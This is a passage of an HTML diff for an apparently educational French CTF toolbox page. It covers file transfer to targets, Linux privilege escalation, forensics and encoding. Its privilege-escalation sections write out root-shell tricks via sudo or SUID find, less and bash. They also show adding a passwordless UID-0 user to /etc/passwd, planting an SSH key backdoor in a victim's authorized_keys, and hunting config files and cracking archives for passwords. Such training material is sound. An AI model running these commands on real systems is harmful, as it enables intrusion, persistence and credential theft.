+				<div class="col-sm-12 map-color-text "><p>Dès l'instant ou vous arrivez à éxécuter des commandes sur votre cible, vous avez besoin de transférer des fichiers textes ou binaires. <br>
+Vous allez certainement downloader des fichiers pour les analyser, ou uploader des outils tel des backdoors ou des scripts d'élévation de privilèges.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=base64">Copier/Coller en Base64</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Un encodage en base64 permet de faire des copier/coller de fichiers sans se soucier du binaire ou des retours à la ligne</p>
+<pre><code>cat file | base64
+printf 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' | base64 -d &gt; file
+</code></pre>
+<p>Préparez la dernière commande dans votre terminal, elle peut être assez longue, puis copiez/collez là dans votre cible.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=http">Transfert de fichier en lançant un serveur HTTP Server</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Pour transférer un fichier sans se soucier de sa taille, lancer un serveur HTTP et faire un wget, curl</p>
+<pre><code>python -m SimpleHTTPServer 8000
+php -S 0.0.0.0:8000 
+</code></pre>
+<p>Attention, ce nouveau serveur permet à tout le monde de lire l'intégralité de son système de fichier.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=http">Transfert avec un accès ssh</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Si vous avez un accès ssh</p>
+<pre><code>scp file.txt remote_username@10.10.0.2:/remote/directory
+scp -i id_rsa file.txt remote_username@10.10.0.2:/remote/directory
+scp -P 2222 file.txt remote_username@10.10.0.2:/remote/directory
+scp remote_username@10.10.0.2:/remote/file.txt /local/directory
+</code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Elevation_de_Privilege_-_Unix">Elevation de Privilege - Unix
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=privelev">Principe</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Nous venons tout juste d'obtenir l'accès en shell à un serveur.
+Nous allons commencer par faire un inventaire exhaustif de ce qui est accessible au compte sur lequel nous pouvons executer des commandes.<br></p>
+<ul>
+<li>Identifier l'OS, sa version, les patchs de sécurité manquants</li>
+<li>Recenser les outils disponibles : netcat, python, perl..</li>
+<li>Lire tous les fichiers de config, temporaires, backup pour trouver des login/password.<br></li>
+<li>Utiliser les éventuels droits sudo du compte.<br></li>
+<li>Trouver une commande avec SetUID bit.<br></li>
+<li>Trouver un process qui tourne en tache de fond avec des droits root et modifier ses inputs.<br></li>
+<li>Trouver un exploit kernel. Cette dernière option, radicale car elle peut planter la machine, est trés efficace sur les vieux serveurs...</li>
+</ul>
+<p>Sur ses premières machines, il est préférable de faire ces énumérations en lançant les commandes manuellement pour s'approprier les options et les outputs. Une fois à l'aise, et sachant ce que l'on cherche, il est possible d'utiliser des scripts qui font ces énumérations pour nous.</p></div>
+                   </div>
+    
+
+                            <div class="my-section row no-border my-4  map-section map-color-text pl-1"><h4 class="my-vertical-centered" id="section_Fichiers_contenant_des_informations">Fichiers contenant des informations</h4></div>
+                                    <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=fichiers">Fichiers intéressants: txt, cfg,...</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Rechercher les fichiers .txt ou .cfg, appartanant aux autres comptes, avec des droits en lecture trop ouverts.</p>
+<pre><code>find /home -readable -type f  \( -iname \*.txt -o -iname \*.cfg \) 2&gt;/dev/null
+find /home -E . -regex '.*\.(txt|cfg)' 2&gt;/dev/null
+</code></pre>  </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=wordpress">Web app: Wordpress</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le fichier de config d'une appli wordpress s'appelle:</p>
+<pre><code>wp-config.php
+</code></pre>    
+<p>Pour le chercher:</p>
+<pre><code>find /var -name wp-config.php 2&gt;/dev/null
+</code></pre>
+<p>Ce fichier contient les login/password pour se connecter à la base de donnée. Il est possible de dumper la base de donnée et récupérer les login et hashes des comptes wordpress.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=apache">Web server: Apache</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le fichier de config peut porter deux noms:</p>
+<pre><code>httpd.conf
+apache2.conf
+</code></pre>    
+<p>On le trouve généralement dans un des répertoires:</p>
+<pre><code>/etc/apache2/httpd.conf
+/etc/apache2/apache2.conf
+/etc/httpd/httpd.conf
+/etc/httpd/conf/httpd.conf
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=tomcat">Web server: Tomcat</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le fichier de config porte le nom:</p>
+<pre><code>server.xml
+</code></pre> 
+<p>Les mots de passe des utilisateurs se trouvent dans:</p>
+<pre><code>tomcat-users.xml
+</code></pre> 
+<p>On trouve généralement ces fichiers dans un des répertoires:</p>
+<pre><code>TOMCAT-HOME/conf/
+/usr/local/tomcat/conf/
+</code></pre></div>
+                   </div>
+    
+
+                            <div class="my-section row no-border my-4  map-section map-color-text pl-1"><h4 class="my-vertical-centered" id="section_Sudo">Sudo</h4></div>
+                                    <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sudo">Sudo</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Sudo permet de lancer des commandes en tant qu'un autre utilisateur.<br>
+<br>
+Pour connaitre les droits sudo de votre compte, il faut lancer la commande sudo -l. Il est parfois demandé de saisir votre mot de passe.</p>
+<pre><code>sudo -l
+L'utilisateur user1 peut utiliser les commandes suivantes sur target-host :
+    (ALL) NOPASSWD: /usr/bin/find
+    user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
+</code></pre>
+<p>La première ligne est: (ALL) NOPASSWD: /usr/bin/find<br>
+Il est possible de lancer la commande /usr/bin/find en tant que n'importe quel utilisateur du serveur, en particulier root.     </p>
+<pre><code>sudo /usr/bin/find  
+</code></pre>
+<p>user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
+Il est ici possible de lancer la commande '/usr/bin/python3 /home/user2/run.py' en tant que user2.<br>
+Pour celà on utilise la commande 'sudo' avec le flag '-u user2'</p>
+<pre><code>sudo -u user2 /usr/bin/python3  /home/user2/run.py 
+</code></pre>
+<p>Si l'option NOPASSWD est définie, vous n'avez pas à saisir de mots de passe. Sinon, la commande sudo demande le mot de passe du compte courant. Si vous être entré par un webshell, ou une connection ssh avec clef privée, il faudra se débrouiller pour connaitre le mot de passe.    </p></div>
+                   </div>
+    
+
+                            <div class="my-section row no-border my-4  map-section map-color-text pl-1"><h4 class="my-vertical-centered" id="section_SetUID_bit">SetUID bit</h4></div>
+                                    <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=setUID">SetUID bits</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Identifier les process possédant un setUID bit</p>
+<pre><code>find / -perm -4000 -exec ls -al {} \; 2&gt;/dev/null
+</code></pre>
+<p>Que faire avec un binaire possédant un setUID bit ?</p>
+<pre><code>- Lancer un shell
+- Lire un flag
+- Copier un fichier
+- Ajouter une ligne à un fichier : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
+- ...
+</code></pre></div>
+                   </div>
+    
+
+                            <div class="my-section row no-border my-4  map-section map-color-text pl-1"><h4 class="my-vertical-centered" id="section_SUID/Sudo_exploitation">SUID/Sudo exploitation</h4></div>
+                                    <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=shell">Process permettant de lancer un shell</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>De nombreux process permettent de lancer un shell. Idéal s'ils sont en sudo ou avec un setUID bit.</p>
+<pre><code>- find
+- nmap
+- vi
+- less
+- awk
+- tee
+...
+</code></pre>
+<p>Reference: <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=less">Sudo/SUID bit - less</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Less peut être utilisé pour lire des fichiers. Presser q pour sortir du lecteur.</p>
+<pre><code>./less flag.txt
+</code></pre>
+<p>ou pour obtenir un shell en ouvrant un fichier, et une fois dans le lecteur ouvrir un shell en tapant !/bin/sh</p>
+<pre><code>./less fichier
+!/bin/sh
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=privbash">Sudo/SUID bit - bash</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Lancé par sudo ou avec un SUID bit, bash va dropper ses privilèges. Pour garder l'identifiant root, utiliser l'option -p.</p>
+<pre><code>sudo -yolo /bin/bash -p
+</code></pre>
+<pre><code>./bash -p
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=findsh">Sudo/SUID bit - find</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Il est possible d'utiliser la commande -exec de find pour ouvrir un shell.<br>
+On recherche n'importe quel fichier, et c'est un prétexte pour lancer la commande /bin/sh.<br>
+Ici avec un sudo, le shell sera ouvert en tant que user2:   </p>
+<pre><code>sudo -u user /usr/bin/find . -name readme.txt -exec /bin/sh \;
+</code></pre>
+<p>Si on trouve la commande find, copiée dans un répertoire avec le SUID bit actif, on l'exploite de la même façon:</p>
+<pre><code>./find . -name readme.txt -exec /bin/sh \;
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=etcpasswd">Ajouter un user root sans mot de passe</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Vous disposez des droits pour modifier /etc/passwd. Par exemple tee avec un sudo en root.
+Ajoutez une entrée avec un UID de 0, et un mot de passe vide.</p>
+<pre><code>echo myroot::0:0:::/bin/bash | sudo tee -a /etc/passwd 
+su myroot 
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=pubkey">Ajouter une backdoor ssh en injectant une clef publique.</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Si une commande avec les droits root permet d'ajouter une ligne: ex: tee</p>
+<pre><code>echo 'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com' | sudo tee -a /home/victim/.ssh/authorized_keys
+ssh -i id_rsa victim@iptarget
+</code></pre></div>
+                   </div>
+    
+
+                            <div class="my-section row no-border my-4  map-section map-color-text pl-1"><h4 class="my-vertical-centered" id="section_Exploitation_de_process">Exploitation de process</h4></div>
+                                    <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ps">ps</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Identifier les process lancés par root</p>
+<pre><code>ps eaxf
+</code></pre>
+<p>Une fois un process identifé, regarder s'il est possible de modifier les fichiers lus par le process, ou si le process a des vulnérabilités connues.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=cron">Cron</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Identifier les taches lancées par cron.</p>
+<pre><code>cat /etc/cron.d/*
+cat /var/spool/cron/*
+crontab -l
+cat /etc/crontab
+cat /etc/cron.(time)
+systemctl list-timers
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=process">Process Spy</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>With the ps command, you may miss a small process, launched every 2 minutes, which will process a batch file in 5 seconds before disappearing.
+The pspy tool monitors the processes for you.</p>
+<pre><code>https://github.com/DominicBreuker/pspy
+</code></pre></div>
+                   </div>
+    
+
+                            <div class="my-section row no-border my-4  map-section map-color-text pl-1"><h4 class="my-vertical-centered" id="section_Kernel_exploit">Kernel exploit</h4></div>
+                                    <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=os">Kernel exploit</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Linux Distib version:</p>
+<pre><code>cat /etc/issue
+Ubuntu 18.04.3 LTS 
+</code></pre>
+<p>Linux kernel version: 5.0.0-37-generic</p>
+<pre><code>uname -a
+Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<p>Once the kernel version is known, it is possible to search for a kernel exploit<br>
+<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br>
+Never run an unknown binary !<br>
+Get the sources, read them, understand what they do, compile yourself, and only then run them... Knowing that there is a high risk of crashing the server.</p></div>
+                   </div>
+    
+
+                            <div class="my-section row no-border my-4  map-section map-color-text pl-1"><h4 class="my-vertical-centered" id="section_Enumeration_scripts">Enumeration scripts</h4></div>
+                                    <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=linenum">Enum scripts</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Some well known script automate the enumeration process.<br>
+Test them and find the one that suits you best.</p>
+<pre><code>linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
+unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
+lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
+</code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Forensic">Forensic
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=file">Identifier un fichier</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Identifier le type d'un fichier se fait généralement en regardant l'extension du fichier.<br>
+<em>.zip: archives compressées au format zip.<br>
+</em>.doc: fichiers Words.   </p>
+<p>Parfois l'extension ne correspond pas, ou le fichier n'en a pas.<br>
+La commande 'file' examine le contenu du fichier, à la recherche d'entêtes caractéristiques.    </p>
+<pre><code>file secret.zip</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=zip">Zip chiffré</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Cracker un zip chiffré avec une liste de mots de passe   </p>
+<pre><code>fcrackzip -u -v -D -p rockyou.txt secret.zip</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=mdb">Mdb - Microsoft Access Database</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Vérification du format du fichier:</p>
+<pre><code>$ file backup.mdb
+backup.mdb: Microsoft Access Database</code></pre>
+<p>Si besoin, installer les outils:</p>
+<pre><code>apt-get install mdbtools</code></pre>
+<p>Lister les tables, et les dumper.</p>
+<pre><code>mdb-tables backup.mdb 
+mdb-export backup.mdp  users passwd</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=pst">Pst - Outlook email file</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Vérification du format du fichier:</p>
+<pre><code>$ file mails.pst
+mails.pst: Microsoft Outlook email folder</code></pre>
+<p>Si besoin, installer les outils:</p>
+<pre><code>apt-get install pst-utils</code></pre>
+<p>Extraire les boites mails, et les lire.</p>
+<pre><code>readpst mails.pst 
+cat mails.mbox</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=odt">Odt -</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Un fichier Odt est un fichier de traitement de texte tel OpenOffice ou LibreOffice, similaire à un document Word Docx.</p>
+<p>Vérification du format du fichier:</p>
+<pre><code>$ file doc.odt
+doc.odt: OpenDocument Text</code></pre>
+<p>Le fichier est une archive au format Zip contenant une arborescence de fichiers xml.<br>
+On peut la dézipper et regarder le contenu des fichiers.</p>
+<pre><code>unzip doc.odt    
+cat content.xml</code></pre>
+<p>On peut aussi utiliser odt2txt pour extraire le texte:</p>
+<pre><code>odt2txt doc.odt</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=wireshark">Wireshark - Extraire un flux TCP</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><u>Méthode 1:</u><br>
+Dans le Menu [Statistiques], lance l'outil [Conversations]<br>
+Le premier onglet liste les trames ethernets.<br>
+Le second onglet liste les paquets IP extraits des trames ethernets. Il permet d'identifier les IP des machines.<br>
+L'onglet TCP, liste les sessions TCP contenues dans les paquets IP et reconstituées par Wireshark.<br>
+Selectionne l'onglet TCP, click sur un flux TCP puis le bouton 'follow Stream'       </p>
+<p><u>Méthode 2:</u><br>
+Survoler les paquets, identifier le flux TCP, et faire un Click droit sur un paquet TCP, et 'Suivre/TCP Stream'. </p>
+<pre><code></code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=tshark">Tshark - Extraire un flux TCP</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Identifier les connections TCP   </p>
+<pre><code>tshark -nlr FILENAME -Y tcp.flags.syn==1 -T fields -e tcp.stream</code></pre>
+<p>Tshark recherche les connections TCP et leur donne un identifiant: 0, 1,...   </p>
+<p>Dumper le contenu de chaque flux en remplaçant ID par l'identifiant du flux: 0, 1,...   </p>
+<pre><code>tshark -nlr FILENAME -qz "follow,tcp,ascii,ID"</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=steghide">Steghide - Cacher un fichier dans une image</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><u>Cacher un fichier dans une image</u></p>
+<pre><code>steghide embed -cf IMAGEFILE -ef FILETOHIDE </code></pre>
+<p><u>Extraire le fichier </u></p>
+<pre><code>steghide extract -sf IMAGEFILE -p PASSWORD</code></pre>
+<p><u>Bruteforcer l'extraction avec rockyou </u></p>
+<pre><code>ROCKYOUFILE=/usr/share/wordlists/rockyou.txt
+ROCKYOULIST=`cat /usr/share/wordlists/rockyou.txt`
+for word in $ROCKYOULIST
+do
+    echo $word
+    ret=`steghide extract -sf $1 -p $word`
+    if [ $? -eq 0 ]
+    then
+        echo Found 
+        exit 0
+    fi
+done</code></pre>
+<p><u>Et en vidéo ?</u>    </p>
+<button id="video-proc-stegano" type="button" onclick="OnVideoButtonClick(this.id)">Tuto Stegano</button></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=DiskImageMount">Lire une image disque brute</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><u>Mounter le système de fichier sur le répertoire  /tmp</u></p>
+<pre><code>mkdir /tmp/tmpmnt
+sudo mount disk.img /tmp/tmpmnt
+ls -al /tmp/tmpmnt
+</code></pre>  
+<p><u>Démounter le point de mountage</u>   </p>
+<pre><code>sudo umount /tmp/tmpmnt </code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=photorec">Photorec - Recupérer des fichiers effacés</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>photorec disk.img    
+</code></pre> </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=veracrypt">TrueCrypt/Veracrypt - Accéder à une partition chiffrée</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Créer un point de montage sur le disque.     </p>
+<pre><code>mkdir /tmp/tmpmnt
+</code></pre> 
+<p>Utiliser Veracrypt en mode de compatibilité TrueCrypt (option -tc) et sans accélération (-m=nokernelcrypto) pour monter le disque.</p>
+<pre><code>sudo veracrypt -tc -m=nokernelcrypto  --mount truecrypt_safe.img /tmp/tmpmnt
+Enter password for truecrypt_safe.img: 
+Enter keyfile [none]: 
+Protect hidden volume (if any)? (y=Yes/n=No) [No]: 
+</code></pre>  </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=tc2john">TrueCrypt - Bruteforce password</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><u>Extraire le Hash</u>    </p>
+<pre><code>$ truecrypt2john.py truecrypt_safe.img &gt; hash
+</code></pre> 
+<p><u>Casser le Hash</u>    </p>
+<pre><code>$ john --format=tc_ripemd160 hash
+</code></pre> </div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Acteurs">Acteurs
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=owasp">OWASP</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>L'Open Web Application Security Project (OWASP) est une communauté, fondée en 2001, qui produit et met gratuitement à disposition des articles, méthodologies, outils...<br>
+Elle publie tous les ans le Top 10 des failles de sécurités Web.<br>
+Elle publie l'OWASP Testing Guide : un guide des best practices depentesting.<br>
+Elle publie l'OWASP Development Guide: un guide visant à écrire du code sans failles de sécurité.<br>
+<a href="https://www.owasp.org">Site officiel: </a><a href="https://www.owasp.org">https://www.owasp.org</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=mitre">MITRE Corporation</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Mitre est l'organisation, financée par la Défense des Etats unis, qui a mis en place et maintient le référencement des CVE:  Common Vulnerabilities and Exposures) <br>
+<a href="https://en.wikipedia.org/wiki/Mitre_Corporation"></a><a href="https://en.wikipedia.org/wiki/Mitre_Corporation">https://en.wikipedia.org/wiki/Mitre_Corporation</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=cve">CVE</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Une CVE, pour Common Vulnerabilities and Exposures, est une référence pour une faille de sécurité.<br>
+<a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures"></a><a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures</a></p></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Encode">Encode
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=EncodeHex">Encodage hexadecimal</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><br></p>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Texte à encoder</label><br>
